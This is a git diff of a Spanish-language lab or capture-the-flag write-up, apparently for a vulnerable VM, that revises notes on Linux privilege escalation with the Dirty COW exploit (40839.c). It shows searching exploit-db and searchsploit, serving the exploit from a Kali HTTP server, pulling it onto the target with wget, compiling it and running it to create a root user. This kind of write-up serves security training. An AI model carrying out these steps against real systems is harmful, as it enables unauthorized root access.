@@ -338,84 +338,77 @@ export SHELL=bash
 
 ## Elevacion de privilegios
 
-Compruebo la version de linux que ejecuta la maquina objetivo:
-
-```bash
-uname -a
-```
+Compruebo la version de linux que ejecuta la maquina objetivo con el comando `uname -a`
 
 ![alt text](image-20.png)
 
-Obtengo que esta ejecutando un kali
-
-2.6.32
+Obtengo que esta ejecutando un Linux 2.6.32...
 
 ![alt text](image.png)
 
-site:exploit-db.com Linux Kernel 2.6
+Para realizar un ataque de kernel para obtener el root directamente busco en Google si existe un exploit para ello usando el termino de busqueda:  `site:exploit-db.com Kernel Linux 2.6`
 
 ![alt text](image-22.png)
 
+Nos aparece un exploit que nos indica que genera una nueva linea en el fichero `/etc/passwd`
+
+Tambien puedo hacer la busqueda en exploit-db directamente.
+
 ![alt text](image-21.png)
+
+Una vez localizado un exploit, compruebo si lo tengo en mi maquina kali mediante el comando
+
+```bash
+searchsploit Linux Kernel 2.6
+```
 
 ![alt text](image-23.png)
 
+Y encuentro que tengo el mismo exploit que encontre en internet en mi maquina kali, asi que lo copio a mi carpeta de trabajo para poder trabajar con el si fuera necesario modificar algo.
+
 ![alt text](image-24.png)
 
+El exploit esta realizado en C por lo que necesito compilarlo en la maquina objetivo y ejecutarlo desde ella. 
 
+Para esto levanto un servidor en mi maquina kali con el comando:
 
-![alt text](image-2.png)
-
-Dirty COW exploit.
-
-![alt text](image.png)
-
-└─$ cp /usr/share/exploitdb/exploits/linux/local/40839.c /home/kali 
-
-
-
-
-https://www.exploit-db.com/exploits/40839
-
-
-
+```bash
 python3 -m http.server 8080
+```
 
 ![alt text](image-1.png)
 
+y ahora desde la shell de la maquina objetivo me desplazo a una carpeta que tenga opciones de escritura, normalmente suele tenerlo tmp y lo descargo con el comando
 
-
-descargo el 40839.c en fristi con wget <ipkali:8080/40839.c>
+```bash
+wget 10.0.2.14:8080/40839.c
+```
 
 ![alt text](image-2.png)
 
-compilar exploit en la maquina objetivo
+Ahora realizo la compilacion del exploit en la maquina objetivo con el comando:
 
-
-
+```bash
 gcc -pthread 40839.c -o dirty -lcrypt
+```
 
-chmod  +x dirty
+Le damos permiso de ejecucion:
 
-run exploit : ./dirty
+```bash
+chmod +x dirty
+```
+
+Y ejecutamos el exploit con: `./dirty`
 
 ![alt text](image-3.png)
 
-nos pide clave pero le pulso intro y nos crea el usuario firefart con permisos root
+me pide clave pero le pulso intro y nos crea el usuario firefart con permisos root
 
-
-
-
-
-
-
-
-
-
-
-
+Tras un tiempo de procesamiento que parece que se queda bloqueado
 
 ![alt text](<image (2).png>)
+
+Nos da un el "DONE"
 
 ![alt text](<image (3).png>) 
 
